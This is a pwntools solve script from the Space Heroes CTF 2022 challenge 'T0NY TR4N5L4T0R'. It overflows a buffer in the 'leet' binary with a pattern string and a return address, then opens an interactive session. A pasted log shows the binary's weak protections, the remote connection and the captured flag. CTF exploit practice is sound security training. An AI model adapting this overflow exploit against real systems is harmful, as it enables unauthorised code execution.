from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './leet'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "0.cloud.chals.io"
  PORT = 26008
  s = remote(HOST, PORT)
  #libc = ELF("./libc6_2.33-1_amd64.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  #libc = elf.libc

#s.recvuntil("W31c0m3 70 70ny'5 7r4n51470r.\n")

buf  = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAG"
buf += "\x1d\x92\x04\x08\x01"
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_T0NY_TR4N5L4T0R$ python solve.py r
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_T0NY_TR4N5L4T0R/leet'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to 0.cloud.chals.io on port 26008: Done
[*] Switching to interactive mode
W31c0m3 70 70ny'5 7r4n51470r.
Translating the string AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAG\x1d\x92\x0 to 70NY 5P34K...
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
Swapped a -> /
aAA0AAFAAbAA1AAG\x1d\x92\x0 Translation: /\/\/\%/\/\s/\/\B/\/\$/\/\n/\/\C/\/\-/\/\(/\/\D/\/\;/\/\)/\/\EAAaAA0AAFAAbAA1AAG\x1d\x92\x0

84ck 50 500n?
shctf{Y00_175_70NY_574RK}
'''
